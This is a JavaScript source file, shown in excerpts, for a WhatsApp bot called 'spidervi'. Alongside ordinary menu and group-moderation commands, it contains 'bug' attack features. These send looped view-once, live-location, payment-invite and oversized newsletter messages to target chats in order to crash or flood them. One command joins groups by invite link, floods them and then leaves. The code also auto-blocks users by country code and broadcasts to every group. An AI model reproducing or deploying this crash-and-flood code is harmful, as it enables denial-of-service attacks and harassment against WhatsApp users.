module.exports = async (spidervi, m, store) => {
try {
...
const botNumber = await spidervi.decodeJid(spidervi.user.id)
const sender = m.key.fromMe ? (spidervi.user.id.split(':')[0]+'@s.whatsapp.net' || spidervi.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await spidervi.groupMetadata(m.chat).catch(e => {}) : ''
...
if (m.sender.startsWith('212')) return spidervi.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('48')) return spidervi.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('60')) return spidervi.updateBlockStatus(m.sender, 'block')
// WARNA ACAK
...
// BUTTON VIDEO
   spidervi.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: spidervi.waUploadToServer
      })
      ...
      await spidervi.sendPresenceUpdate('composing', jid)
      return spidervi.relayMessage(jid, message["message"], {
...
list.push({
displayName: await spidervi.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await spidervi.getName(i + '@s.whatsapp.net')}\n
FN:${await spidervi.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
...
try {
ppuser = await spidervi.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
await spidervi.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
...
async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    ...
    spidervi.relayMessage(jid, messageContent.message, {
...
async function sendLiveLocationMessage(jid) {
  ...
  await spidervi.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
...
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return spidervi.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
...
await spidervi.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d725cb646cb63f7559486.jpg" } }, { upload: spidervi.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
let { key } = await spidervi.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await spidervi.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
...
spidervi.relayMessage(jid, order.message, { messageId: order.key.id})
}


const reply = (teks) => { 
spidervi.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
...
spidervi.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
spidervi.groupParticipantsUpdate(m.chat, [sender], 'delete')
spidervi.sendMessage(m.chat, { delete: m.key })
}
}
switch (command) {
...
const menu = `𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6`
     ...
     await spidervi.sendMessage(m.chat, {
...
case "owner": {
const repf = await spidervi.sendMessage(from, { 
contacts: { 
...
if (!isPremium) return reply('_</> Can only be used by premium users..._')
  ...
  var contactInfo = await spidervi.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
...
'https://telegra.ph/file/91d8701c2783775637125.mp4',
            ...
            await spidervi.sendMessage(m.chat, { video: { url: dir[Math.floor(Math.random() * dir.length)] }, caption: `*_</> done. video anime by deltacrash_*` }, { quoted: m })
	}
        break
...
let getGroups = await spidervi.groupFetchAllParticipating()
...
for (let x of data) {
await spidervi.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await spidervi.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await sleep(100)
}
...
let ceknye = await spidervi.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
case "ui-grup": {
    ...
    try {
      ...
      let groupTarget = await spidervi.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONE BUG HAS BEEN SENT TO THE GROUP!.*");
      spidervi.groupLeave(groupTarget);
    } catch (error) {
...
let ceknya = await spidervi.onWhatsApp(prrkek)
...
break
  ...
  const pingMsg = await spidervi.sendMessage(m.chat, { text: '*sᵖᵉᵉᵈ*' });

 await spidervi.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
...
case 'self': {
if (!isOwner) return reply(mess.only.owner)
spidervi.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
spidervi.public = true
reply('succes')
}
break
//=================================================//
...
await spidervi.sendMessage(victim, { text: '' }, { quoted: xbug2 })
...
await spidervi.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `spidervi`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await spidervi.sendMessage(m.chat, { react: { text: '😈', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
...
let target = await spidervi.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
...
await spidervi.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
...
console.log(e)
spidervi.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}
